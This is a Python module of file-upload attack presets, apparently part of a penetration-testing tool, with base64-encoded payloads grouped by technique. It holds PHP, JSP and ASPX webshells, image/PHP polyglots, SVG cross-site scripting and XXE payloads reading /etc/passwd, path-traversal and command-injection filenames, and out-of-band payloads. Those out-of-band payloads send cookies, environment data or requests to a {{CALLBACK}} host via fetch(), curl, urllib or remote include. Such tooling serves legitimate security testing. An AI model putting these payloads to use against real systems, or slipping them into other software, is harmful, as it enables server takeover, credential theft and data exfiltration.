"""
Upload attack presets ported from electron/renderer/js/upload-presets.js.

All payload content is stored base64-encoded. Decoded on access via
get_presets() / get_presets_by_category(), with optional {{CALLBACK}}
replacement for OOB payloads.
"""
from __future__ import annotations

import base64
import copy
import re
from typing import Optional

CATEGORIES = [
    "Extension Bypass",
    "MIME Mismatch",
    "Polyglot",
    "SVG",
    "SVG (React/Flask)",
    "Path Traversal",
    "Filename Injection",
    "Webshell",
    "Out-of-Band",
    "Python Execution",
    "Edge Cases",
]

_PRESETS: list[dict] = [
    # -- Extension Bypass -------------------------------------------------
    {
        "id": "ext-double",
        "category": "Extension Bypass",
        "name": "Double extension (.php.jpg)",
        "description": "Tests if the server only checks the final extension.",
        "filename": "shell.php.jpg",
        "content_type": "image/jpeg",
        "content_b64": "PD9waHAgZWNobyAiUkNFX09LIjsgPz4=",
        "is_binary": False,
    },
    {
        "id": "ext-null-byte",
        "category": "Extension Bypass",
        "name": "Null byte (.php%00.jpg)",
        "description": "Null byte truncation — older runtimes may ignore everything after \\x00.",
        "filename": "shell.php%00.jpg",
        "content_type": "image/jpeg",
        "content_b64": "PD9waHAgZWNobyAiUkNFX09LIjsgPz4=",
        "is_binary": False,
    },
    {
        "id": "ext-case-swap",
        "category": "Extension Bypass",
        "name": "Case swap (.pHp)",
        "description": "Mixed-case extension to bypass case-sensitive blocklists.",
        "filename": "shell.pHp",
        "content_type": "application/x-httpd-php",
        "content_b64": "PD9waHAgZWNobyAiUkNFX09LIjsgPz4=",
        "is_binary": False,
    },
    {
        "id": "ext-trailing-dot",
        "category": "Extension Bypass",
        "name": "Trailing dot (.php.)",
        "description": "Trailing dot — Windows and some servers strip it, leaving .php.",
        "filename": "shell.php.",
        "content_type": "application/octet-stream",
        "content_b64": "PD9waHAgZWNobyAiUkNFX09LIjsgPz4=",
        "is_binary": False,
    },
    {
        "id": "ext-alt-php",
        "category": "Extension Bypass",
        "name": "Alt PHP ext (.phtml)",
        "description": "Alternative PHP extension that may still be executed by Apache.",
        "filename": "shell.phtml",
        "content_type": "application/octet-stream",
        "content_b64": "PD9waHAgZWNobyAiUkNFX09LIjsgPz4=",
        "is_binary": False,
    },
    {
        "id": "ext-htaccess",
        "category": "Extension Bypass",
        "name": ".htaccess override",
        "description": "Upload .htaccess to make .txt files execute as PHP.",
        "filename": ".htaccess",
        "content_type": "text/plain",
        "content_b64": "QWRkVHlwZSBhcHBsaWNhdGlvbi94LWh0dHBkLXBocCAudHh0",
        "is_binary": False,
    },

    # -- MIME Mismatch ----------------------------------------------------
    {
        "id": "mime-php-as-image",
        "category": "MIME Mismatch",
        "name": "PHP body, image/jpeg MIME",
        "description": "Server trusts Content-Type but body is PHP.",
        "filename": "avatar.php",
        "content_type": "image/jpeg",
        "content_b64": "PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+",
        "is_binary": False,
    },
    {
        "id": "mime-jsp-as-image",
        "category": "MIME Mismatch",
        "name": "JSP body, image/png MIME",
        "description": "JSP webshell disguised as PNG via Content-Type.",
        "filename": "image.jsp",
        "content_type": "image/png",
        "content_b64": "",
        "is_binary": False,
    },
    {
        "id": "mime-html-as-image",
        "category": "MIME Mismatch",
        "name": "HTML body, image/gif MIME",
        "description": "Tests if uploaded file is served back with the original Content-Type, enabling stored XSS.",
        "filename": "pic.gif",
        "content_type": "image/gif",
        "content_b64": "PGh0bWw+PGJvZHk+PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+PC9ib2R5PjwvaHRtbD4=",
        "is_binary": False,
    },

    # -- Polyglot Files ---------------------------------------------------
    {
        "id": "poly-gif-php",
        "category": "Polyglot",
        "name": "GIF89a + PHP",
        "description": "Starts with valid GIF magic bytes, followed by PHP code. Passes magic-byte checks.",
        "filename": "image.php.gif",
        "content_type": "image/gif",
        "content_b64": "R0lGODlhOzw/cGhwIGVjaG8gIlJDRV9PSyI7ID8+",
        "is_binary": False,
    },
    {
        "id": "poly-png-php",
        "category": "Polyglot",
        "name": "PNG header + PHP (binary)",
        "description": "Minimal PNG header bytes followed by PHP payload. Binary preset.",
        "filename": "image.php.png",
        "content_type": "image/png",
        "content_b64": "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggjw/cGhwIGVjaG8gIlJDRV9PSyI7ID8+",
        "is_binary": True,
    },
    {
        "id": "poly-bmp-js",
        "category": "Polyglot",
        "name": "BMP + JavaScript",
        "description": "BM header that doubles as valid JS. Tests XSS via image upload when served inline.",
        "filename": "image.bmp.html",
        "content_type": "image/bmp",
        "content_b64": "Qk08c2NyaXB0PmFsZXJ0KGRvY3VtZW50LmRvbWFpbik8L3NjcmlwdD4=",
        "is_binary": False,
    },

    # -- SVG Attacks ------------------------------------------------------
    {
        "id": "svg-benign",
        "category": "SVG",
        "name": "Benign smiley face (baseline)",
        "description": "Clean SVG that renders a yellow smiley face. Use this to confirm the upload/render pipeline works before trying attack payloads.",
        "filename": "smiley.svg",
        "content_type": "image/svg+xml",
        "content_b64": "",
        "is_binary": False,
    },
    {
        "id": "svg-xss",
        "category": "SVG",
        "name": "SVG with inline script (XSS)",
        "description": "SVG containing <script> — stored XSS if served as image/svg+xml.",
        "filename": "image.svg",
        "content_type": "image/svg+xml",
        "content_b64": "PD94bWwgdmVyc2lvbj0iMS4wIj8+CjxzdmcgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICA8c2NyaXB0PmFsZXJ0KGRvY3VtZW50LmRvbWFpbik8L3NjcmlwdD4KPC9zdmc+",
        "is_binary": False,
    },
    {
        "id": "svg-onload",
        "category": "SVG",
        "name": "SVG onload event (XSS)",
        "description": "SVG using onload attribute — no <script> tag to bypass naive filters.",
        "filename": "icon.svg",
        "content_type": "image/svg+xml",
        "content_b64": "PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIG9ubG9hZD0iYWxlcnQoZG9jdW1lbnQuZG9tYWluKSI+PHJlY3Qgd2lkdGg9IjEwMCIgaGVpZ2h0PSIxMDAiLz48L3N2Zz4=",
        "is_binary": False,
    },
    {
        "id": "svg-xxe",
        "category": "SVG",
        "name": "SVG with XXE",
        "description": "SVG containing an external entity — tests for XXE during server-side image processing.",
        "filename": "image.svg",
        "content_type": "image/svg+xml",
        "content_b64": "PD94bWwgdmVyc2lvbj0iMS4wIj8+CjwhRE9DVFlQRSBzdmcgWwogIDwhRU5USVRZIHh4ZSBTWVNURU0gImZpbGU6Ly8vZXRjL3Bhc3N3ZCI+Cl0+CjxzdmcgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICA8dGV4dD4meHhlOzwvdGV4dD4KPC9zdmc+",
        "is_binary": False,
    },

    # -- SVG (React + Flask specific) -------------------------------------
    {
        "id": "svg-foreignobject",
        "category": "SVG (React/Flask)",
        "name": "foreignObject HTML embed",
        "description": "Embeds full HTML inside SVG via <foreignObject>. Bypasses SVG-only sanitizers. Fires if inlined via dangerouslySetInnerHTML or react-svg.",
        "filename": "chart.svg",
        "content_type": "image/svg+xml",
        "content_b64": "",
        "is_binary": False,
    },
    {
        "id": "svg-animate-onbegin",
        "category": "SVG (React/Flask)",
        "name": "animate onbegin (no script tag)",
        "description": "Uses <animate onbegin> event handler — no <script> tag, bypasses tag-based filters. Works in inline SVG.",
        "filename": "anim.svg",
        "content_type": "image/svg+xml",
        "content_b64": "PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogIDxhbmltYXRlIGF0dHJpYnV0ZU5hbWU9IngiIHZhbHVlcz0iMCIgYmVnaW49IjBzIiBvbmJlZ2luPSJhbGVydChkb2N1bWVudC5kb21haW4pIi8+CiAgPHJlY3Qgd2lkdGg9IjEwMCIgaGVpZ2h0PSIxMDAiLz4KPC9zdmc+",
        "is_binary": False,
    },
    {
        "id": "svg-onfocusin",
        "category": "SVG (React/Flask)",
        "name": "onfocusin autofocus (no click)",
        "description": "Triggers XSS on focus without user interaction. If React inlines the SVG, autofocus fires immediately.",
        "filename": "icon.svg",
        "content_type": "image/svg+xml",
        "content_b64": "PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogIDxyZWN0IHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIiB0YWJpbmRleD0iMCIgb25mb2N1c2luPSJhbGVydChkb2N1bWVudC5kb21haW4pIiBhdXRvZm9jdXM9ImF1dG9mb2N1cyIvPgo8L3N2Zz4=",
        "is_binary": False,
    },
    {
        "id": "svg-javascript-uri",
        "category": "SVG (React/Flask)",
        "name": "javascript: URI in <a> link",
        "description": "SVG <a> with javascript: href. React does not sanitize href attrs — fires on click if SVG is rendered inline.",
        "filename": "link.svg",
        "content_type": "image/svg+xml",
        "content_b64": "",
        "is_binary": False,
    },
    {
        "id": "svg-css-import-ssrf",
        "category": "SVG (React/Flask)",
        "name": "CSS @import SSRF (OOB)",
        "description": "SVG with CSS @import — triggers SSRF when Flask backend processes/renders the SVG with cairosvg, Pillow, or ImageMagick.",
        "filename": "styled.svg",
        "content_type": "image/svg+xml",
        "content_b64": "PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogIDxzdHlsZT4KICAgIEBpbXBvcnQgdXJsKCJodHRwOi8ve3tDQUxMQkFDS319L3VwbG9hZC9jc3MtaW1wb3J0Iik7CiAgPC9zdHlsZT4KICA8cmVjdCB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCIvPgo8L3N2Zz4=",
        "is_binary": False,
    },
    {
        "id": "svg-use-external",
        "category": "SVG (React/Flask)",
        "name": "<use> external ref SSRF (OOB)",
        "description": "SVG <use> referencing an external SVG. Triggers SSRF during server-side SVG parsing (librsvg, cairosvg).",
        "filename": "ref.svg",
        "content_type": "image/svg+xml",
        "content_b64": "PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIj4KICA8dXNlIHhsaW5rOmhyZWY9Imh0dHA6Ly97e0NBTExCQUNLfX0vdXBsb2FkL3VzZS1ocmVmI3BheWxvYWQiLz4KPC9zdmc+",
        "is_binary": False,
    },
    {
        "id": "svg-image-ssrf",
        "category": "SVG (React/Flask)",
        "name": "<image> SSRF (OOB)",
        "description": "SVG <image> tag fetches external resource. Triggers when Flask processes the SVG server-side.",
        "filename": "embed.svg",
        "content_type": "image/svg+xml",
        "content_b64": "PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIj4KICA8aW1hZ2UgeGxpbms6aHJlZj0iaHR0cDovL3t7Q0FMTEJBQ0t9fS91cGxvYWQvaW1hZ2UtaHJlZiIgd2lkdGg9IjEwMCIgaGVpZ2h0PSIxMDAiLz4KPC9zdmc+",
        "is_binary": False,
    },
    {
        "id": "svg-data-uri-script",
        "category": "SVG (React/Flask)",
        "name": "data: URI script (CSP bypass)",
        "description": "SVG <script> loaded via data: URI. Bypasses CSP if data: is allowed in script-src.",
        "filename": "data.svg",
        "content_type": "image/svg+xml",
        "content_b64": "PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogIDxzY3JpcHQgeGxpbms6aHJlZj0iZGF0YTp0ZXh0L2phdmFzY3JpcHQsYWxlcnQoZG9jdW1lbnQuZG9tYWluKSIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiLz4KPC9zdmc+",
        "is_binary": False,
    },
    {
        "id": "svg-cdata-mutation",
        "category": "SVG (React/Flask)",
        "name": "CDATA mutation XSS",
        "description": "Exploits parser differences with CDATA sections. Bypasses older DOMPurify versions and some server-side sanitizers.",
        "filename": "desc.svg",
        "content_type": "image/svg+xml",
        "content_b64": "PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogIDxkZXNjPgogICAgPCFbQ0RBVEFbPC9kZXNjPjxzY3JpcHQ+YWxlcnQoZG9jdW1lbnQuZG9tYWluKTwvc2NyaXB0Pl1dPgogIDwvZGVzYz4KPC9zdmc+",
        "is_binary": False,
    },
    {
        "id": "svg-fetch-exfil",
        "category": "SVG (React/Flask)",
        "name": "fetch() cookie exfiltration (OOB)",
        "description": "SVG onload uses fetch() to steal cookies/tokens to your OOB server. Tests if inline SVG has same-origin access.",
        "filename": "exfil.svg",
        "content_type": "image/svg+xml",
        "content_b64": "PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIG9ubG9hZD0iZmV0Y2goJ2h0dHA6Ly97e0NBTExCQUNLfX0vdXBsb2FkL2ZldGNoLWV4ZmlsP2Q9JytlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuY29va2llKSkiPgogIDxyZWN0IHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIi8+Cjwvc3ZnPg==",
        "is_binary": False,
    },
    {
        "id": "svg-mega-oob",
        "category": "SVG (React/Flask)",
        "name": "MEGA: all triggers in one SVG (OOB)",
        "description": "Single SVG with every trigger mechanism — each hits /upload/{token}. Covers: onload, hover, focusin, animate, set, click, css-import, image-href, use-href, foreignobj, fetch cookies+localStorage+URL.",
        "filename": "preview.svg",
        "content_type": "image/svg+xml",
        "content_b64": "",
        "is_binary": False,
    },

    # -- Path Traversal ---------------------------------------------------
    {
        "id": "path-unix",
        "category": "Path Traversal",
        "name": "Unix path traversal",
        "description": "Filename with ../ sequences — tests if the server writes outside the upload directory.",
        "filename": "../../../tmp/pwned.txt",
        "content_type": "text/plain",
        "content_b64": "cGF0aF90cmF2ZXJzYWxfb2s=",
        "is_binary": False,
    },
    {
        "id": "path-windows",
        "category": "Path Traversal",
        "name": "Windows path traversal",
        "description": "Backslash traversal for Windows servers.",
        "filename": "..\\..\\..\\temp\\pwned.txt",
        "content_type": "text/plain",
        "content_b64": "cGF0aF90cmF2ZXJzYWxfb2s=",
        "is_binary": False,
    },
    {
        "id": "path-url-encoded",
        "category": "Path Traversal",
        "name": "URL-encoded traversal",
        "description": "Double URL-encoded ../ to bypass basic path sanitisation.",
        "filename": "..%252f..%252f..%252ftmp%252fpwned.txt",
        "content_type": "text/plain",
        "content_b64": "cGF0aF90cmF2ZXJzYWxfb2s=",
        "is_binary": False,
    },

    # -- Filename Injection -----------------------------------------------
    {
        "id": "fname-onerror",
        "category": "Filename Injection",
        "name": "alt attr breakout -> onerror",
        "description": 'Breaks out of the alt="" attribute and injects onerror. Tests if the app renders filenames unsanitized in img alt/title attributes.',
        "filename": '" onerror="alert(document.domain)" x="',
        "content_type": "image/svg+xml",
        "content_b64": "PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxIiBoZWlnaHQ9IjEiLz48L3N2Zz4=",
        "is_binary": False,
    },
    {
        "id": "fname-onmouseover",
        "category": "Filename Injection",
        "name": "alt attr breakout -> onmouseover",
        "description": "Injects onmouseover with a full-screen overlay so it triggers on any mouse movement. No click needed.",
        "filename": '" onmouseover="alert(document.domain)" style="position:fixed;top:0;left:0;width:100%;height:100%" x="',
        "content_type": "image/svg+xml",
        "content_b64": "PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxIiBoZWlnaHQ9IjEiLz48L3N2Zz4=",
        "is_binary": False,
    },
    {
        "id": "fname-tag-inject",
        "category": "Filename Injection",
        "name": "Close tag + script injection",
        "description": "Closes the img tag and injects a script element. Tests if the app uses innerHTML or dangerouslySetInnerHTML with filenames.",
        "filename": '"><script>alert(document.domain)</script><img x="',
        "content_type": "image/svg+xml",
        "content_b64": "PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxIiBoZWlnaHQ9IjEiLz48L3N2Zz4=",
        "is_binary": False,
    },
    {
        "id": "fname-oob-exfil",
        "category": "Filename Injection",
        "name": "attr breakout -> fetch exfil (OOB)",
        "description": "Breaks out of alt attr and exfiltrates cookies via fetch to your OOB server.",
        "filename": "\" onfocus=\"fetch('http://{{CALLBACK}}/upload/fname-exfil?d='+encodeURIComponent(document.cookie))\" tabindex=\"0\" autofocus=\"",
        "content_type": "image/svg+xml",
        "content_b64": "PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxIiBoZWlnaHQ9IjEiLz48L3N2Zz4=",
        "is_binary": False,
    },

    # -- Webshells --------------------------------------------------------
    {
        "id": "shell-php",
        "category": "Webshell",
        "name": "PHP system() shell",
        "description": "Minimal PHP webshell — ?cmd=id to test.",
        "filename": "cmd.php",
        "content_type": "application/x-httpd-php",
        "content_b64": "PD9waHAgaWYoaXNzZXQoJF9SRVFVRVNUWyJjbWQiXSkpe3N5c3RlbSgkX1JFUVVFU1RbImNtZCJdKTt9ID8+",
        "is_binary": False,
    },
    {
        "id": "shell-php-short",
        "category": "Webshell",
        "name": "PHP short tag shell",
        "description": "Uses short open tags — works when short_open_tag is On.",
        "filename": "cmd.php",
        "content_type": "application/x-httpd-php",
        "content_b64": "PD89YCRfR0VUW2NtZF1gPz4=",
        "is_binary": False,
    },
    {
        "id": "shell-jsp",
        "category": "Webshell",
        "name": "JSP webshell",
        "description": "Minimal JSP command execution shell.",
        "filename": "cmd.jsp",
        "content_type": "application/octet-stream",
        "content_b64": "",
        "is_binary": False,
    },
    {
        "id": "shell-aspx",
        "category": "Webshell",
        "name": "ASPX webshell",
        "description": "Minimal ASPX command execution shell for IIS/.NET.",
        "filename": "cmd.aspx",
        "content_type": "application/octet-stream",
        "content_b64": "",
        "is_binary": False,
    },

    # -- Out-of-Band (OOB) ------------------------------------------------
    {
        "id": "oob-xxe-http",
        "category": "Out-of-Band",
        "name": "XXE OOB via HTTP",
        "description": "XML with external entity fetching from your callback server.",
        "filename": "oob.xml",
        "content_type": "application/xml",
        "content_b64": "PD94bWwgdmVyc2lvbj0iMS4wIj8+CjwhRE9DVFlQRSBmb28gWwogIDwhRU5USVRZIHh4ZSBTWVNURU0gImh0dHA6Ly97e0NBTExCQUNLfX0vdXBsb2FkL3h4ZS1odHRwIj4KXT4KPHJvb3Q+Jnh4ZTs8L3Jvb3Q+",
        "is_binary": False,
    },
    {
        "id": "oob-xxe-dns",
        "category": "Out-of-Band",
        "name": "XXE OOB via DNS",
        "description": "External entity triggering a DNS lookup.",
        "filename": "oob.xml",
        "content_type": "application/xml",
        "content_b64": "PD94bWwgdmVyc2lvbj0iMS4wIj8+CjwhRE9DVFlQRSBmb28gWwogIDwhRU5USVRZIHh4ZSBTWVNURU0gImh0dHA6Ly94eGUtZG5zLnt7Q0FMTEJBQ0t9fSI+Cl0+Cjxyb290PiZ4eGU7PC9yb290Pg==",
        "is_binary": False,
    },
    {
        "id": "oob-svg-xxe",
        "category": "Out-of-Band",
        "name": "SVG + XXE OOB callback",
        "description": "SVG processed server-side triggers OOB XXE.",
        "filename": "oob.svg",
        "content_type": "image/svg+xml",
        "content_b64": "",
        "is_binary": False,
    },
    {
        "id": "oob-ssrf-pdf",
        "category": "Out-of-Band",
        "name": "PDF click-to-redirect (OOB)",
        "description": "PDF with full-page link annotation. Click anywhere to redirect to OOB server. Works in all browser PDF viewers.",
        "filename": "document.pdf",
        "content_type": "application/pdf",
        "content_b64": "",
        "is_binary": False,
    },
    {
        "id": "oob-ssrf-docx",
        "category": "Out-of-Band",
        "name": "DOCX with external relationships (SSRF)",
        "description": "Real .docx ZIP file with 4 external relationship types in word/_rels/document.xml.rels: attachedTemplate, frame, hyperlink, oleObject. Each hits a different /upload/docx-* token. Triggers SSRF when server processes/opens the document.",
        "filename": "report.docx",
        "content_type": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        "content_b64": "",
        "is_binary": True,
    },
    {
        "id": "oob-rfi-php",
        "category": "Out-of-Band",
        "name": "PHP include OOB",
        "description": "PHP file that includes a remote URL — confirms RFI and triggers OOB callback.",
        "filename": "rfi.php",
        "content_type": "application/x-httpd-php",
        "content_b64": "PD9waHAgaW5jbHVkZSgiaHR0cDovL3t7Q0FMTEJBQ0t9fS91cGxvYWQvcmZpLXBocCIpOyA/Pg==",
        "is_binary": False,
    },

    # -- Python Execution -------------------------------------------------
    {
        "id": "py-exec",
        "category": "Python Execution",
        "name": "Basic urllib OOB ping (.py)",
        "description": "Simple Python script using urllib to ping your OOB server. Tests if .py files can be uploaded and executed.",
        "filename": "script.py",
        "content_type": "text/x-python",
        "content_b64": "aW1wb3J0IHVybGxpYi5yZXF1ZXN0CnVybGxpYi5yZXF1ZXN0LnVybG9wZW4oImh0dHA6Ly97e0NBTExCQUNLfX0vdXBsb2FkL3B5LWV4ZWMiKQ==",
        "is_binary": False,
    },
    {
        "id": "py-exec-txt",
        "category": "Python Execution",
        "name": "Double extension (.py.txt)",
        "description": "Python OOB ping with .py.txt double extension — tests if server strips the last extension and executes .py.",
        "filename": "notes.py.txt",
        "content_type": "text/plain",
        "content_b64": "aW1wb3J0IHVybGxpYi5yZXF1ZXN0CnVybGxpYi5yZXF1ZXN0LnVybG9wZW4oImh0dHA6Ly97e0NBTExCQUNLfX0vdXBsb2FkL3B5LWV4ZWMiKQ==",
        "is_binary": False,
    },
    {
        "id": "py-exec-jpg",
        "category": "Python Execution",
        "name": "Image disguise (.py.jpg)",
        "description": "Python OOB ping with .py.jpg extension and image/jpeg MIME — tests if server only checks final extension or MIME.",
        "filename": "photo.py.jpg",
        "content_type": "image/jpeg",
        "content_b64": "aW1wb3J0IHVybGxpYi5yZXF1ZXN0CnVybGxpYi5yZXF1ZXN0LnVybG9wZW4oImh0dHA6Ly97e0NBTExCQUNLfX0vdXBsb2FkL3B5LWV4ZWMiKQ==",
        "is_binary": False,
    },
    {
        "id": "py-shebang",
        "category": "Python Execution",
        "name": "With shebang line (.py)",
        "description": "Python script with #!/usr/bin/env python3 shebang — executable on Unix if server sets +x or runs via shell.",
        "filename": "run.py",
        "content_type": "text/x-python",
        "content_b64": "IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwppbXBvcnQgdXJsbGliLnJlcXVlc3QKdXJsbGliLnJlcXVlc3QudXJsb3BlbigiaHR0cDovL3t7Q0FMTEJBQ0t9fS91cGxvYWQvcHktc2hlYmFuZyIp",
        "is_binary": False,
    },
    {
        "id": "py-import",
        "category": "Python Execution",
        "name": "Obfuscated __import__ (.py)",
        "description": 'Single-line Python using __import__ — bypasses naive content filters looking for "import urllib".',
        "filename": "utils.py",
        "content_type": "text/x-python",
        "content_b64": "X19pbXBvcnRfXygidXJsbGliLnJlcXVlc3QiKS5yZXF1ZXN0LnVybG9wZW4oImh0dHA6Ly97e0NBTExCQUNLfX0vdXBsb2FkL3B5LWltcG9ydCIp",
        "is_binary": False,
    },
    {
        "id": "py-os",
        "category": "Python Execution",
        "name": "os.system + curl (.py)",
        "description": "Uses os.system to shell out to curl — works even if urllib is blocked but curl is available on the server.",
        "filename": "task.py",
        "content_type": "text/x-python",
        "content_b64": "aW1wb3J0IG9zCm9zLnN5c3RlbSgiY3VybCBodHRwOi8ve3tDQUxMQkFDS319L3VwbG9hZC9weS1vcyIp",
        "is_binary": False,
    },
    {
        "id": "py-socket",
        "category": "Python Execution",
        "name": "Raw socket (no http libs) (.py)",
        "description": "Uses raw socket — works even if urllib/requests are stripped. Minimal dependency.",
        "filename": "helper.py",
        "content_type": "text/x-python",
        "content_b64": "",
        "is_binary": False,
    },
    {
        "id": "py-wsgi",
        "category": "Python Execution",
        "name": "WSGI application (.wsgi)",
        "description": "Python WSGI app format — if the server auto-deploys .wsgi files (mod_wsgi, uWSGI), this executes on first request.",
        "filename": "app.wsgi",
        "content_type": "application/octet-stream",
        "content_b64": "",
        "is_binary": False,
    },
    {
        "id": "py-pth",
        "category": "Python Execution",
        "name": ".pth auto-execute (site-packages)",
        "description": ".pth files placed in site-packages are auto-executed by Python on startup. If upload path overlaps with a Python environment, this runs silently.",
        "filename": "debug.pth",
        "content_type": "text/plain",
        "content_b64": "aW1wb3J0IHVybGxpYi5yZXF1ZXN0OyB1cmxsaWIucmVxdWVzdC51cmxvcGVuKCJodHRwOi8ve3tDQUxMQkFDS319L3VwbG9hZC9weS1wdGgiKQ==",
        "is_binary": False,
    },
    {
        "id": "py-pyw",
        "category": "Python Execution",
        "name": "Windowless Python (.pyw)",
        "description": ".pyw runs via pythonw.exe on Windows without a console window — stealthier execution path.",
        "filename": "service.pyw",
        "content_type": "application/octet-stream",
        "content_b64": "aW1wb3J0IHVybGxpYi5yZXF1ZXN0CnVybGxpYi5yZXF1ZXN0LnVybG9wZW4oImh0dHA6Ly97e0NBTExCQUNLfX0vdXBsb2FkL3B5LWV4ZWMiKQ==",
        "is_binary": False,
    },
    {
        "id": "py-exfil",
        "category": "Python Execution",
        "name": "Env exfiltration via POST (.py)",
        "description": "Exfiltrates cwd, username, and directory listing to your OOB server via POST body. Check /api/live for the JSON payload.",
        "filename": "report.py",
        "content_type": "text/x-python",
        "content_b64": "",
        "is_binary": False,
    },

    # -- Edge Cases -------------------------------------------------------
    {
        "id": "edge-empty-filename",
        "category": "Edge Cases",
        "name": "Empty filename",
        "description": "Empty filename string — tests server behaviour with missing filenames.",
        "filename": "",
        "content_type": "application/octet-stream",
        "content_b64": "dGVzdA==",
        "is_binary": False,
    },
    {
        "id": "edge-long-filename",
        "category": "Edge Cases",
        "name": "Oversized filename (500 chars)",
        "description": "Very long filename to test buffer handling and path length limits.",
        "filename": "A" * 496 + ".php",
        "content_type": "application/octet-stream",
        "content_b64": "PD9waHAgZWNobyAiUkNFX09LIjsgPz4=",
        "is_binary": False,
    },
    {
        "id": "edge-special-chars",
        "category": "Edge Cases",
        "name": "Special chars in filename",
        "description": "Filename with semicolons, pipes, backticks — tests command injection via filename.",
        "filename": "file;id|`whoami`.php",
        "content_type": "application/octet-stream",
        "content_b64": "dGVzdA==",
        "is_binary": False,
    },
    {
        "id": "edge-zero-byte",
        "category": "Edge Cases",
        "name": "Zero-byte file",
        "description": "Empty file body — tests how the server handles zero-length uploads.",
        "filename": "empty.php",
        "content_type": "application/x-httpd-php",
        "content_b64": "",  # zero-length content
        "is_binary": False,
    },
]

_CALLBACK_RE = re.compile(r"\{\{CALLBACK\}\}")


def _strip_protocol(url: str) -> str:
    """Strip http:// or https:// prefix so it can be substituted into
    preset templates that already contain ``http://{{CALLBACK}}/...``."""
    url = url.rstrip("/")
    if url.startswith("https://"):
        return url[len("https://"):]
    if url.startswith("http://"):
        return url[len("http://"):]
    return url


def _decode_preset(preset: dict, callback_url: Optional[str]) -> dict:
    """Return a copy of the preset with decoded `content` bytes."""
    out = copy.copy(preset)
    b64 = out.pop("content_b64")

    # Preset templates use ``http://{{CALLBACK}}/path`` so the replacement
    # value must be just the host (+ optional port), not a full URL.
    cb_host = _strip_protocol(callback_url) if callback_url else None

    if not b64:
        out["content"] = b""
    else:
        # JS atob is lenient with padding; Python is strict.
        # A length of 1 mod 4 is never valid — drop the orphan char.
        if len(b64) % 4 == 1:
            b64 = b64[:-1]
        padded = b64 + "=" * (-len(b64) % 4)
        raw = base64.b64decode(padded)
        if not out["is_binary"] and cb_host is not None:
            text = raw.decode("utf-8", errors="surrogateescape")
            text = _CALLBACK_RE.sub(cb_host, text)
            raw = text.encode("utf-8", errors="surrogateescape")
        out["content"] = raw

    # Also replace {{CALLBACK}} in filename for OOB filename-injection presets
    if cb_host is not None and "{{CALLBACK}}" in out["filename"]:
        out["filename"] = out["filename"].replace("{{CALLBACK}}", cb_host)

    return out


def get_presets(callback_url: Optional[str] = None) -> list[dict]:
    """Return all presets with decoded content bytes.

    If callback_url is provided, {{CALLBACK}} placeholders in text
    content and filenames are replaced with that URL.
    """
    return [_decode_preset(p, callback_url) for p in _PRESETS]


def get_presets_by_category(
    category: str, callback_url: Optional[str] = None
) -> list[dict]:
    """Return presets filtered by category name."""
    return [
        _decode_preset(p, callback_url)
        for p in _PRESETS
        if p["category"] == category
    ]


def list_categories() -> list[str]:
    """Return the list of all preset categories."""
    return list(CATEGORIES)
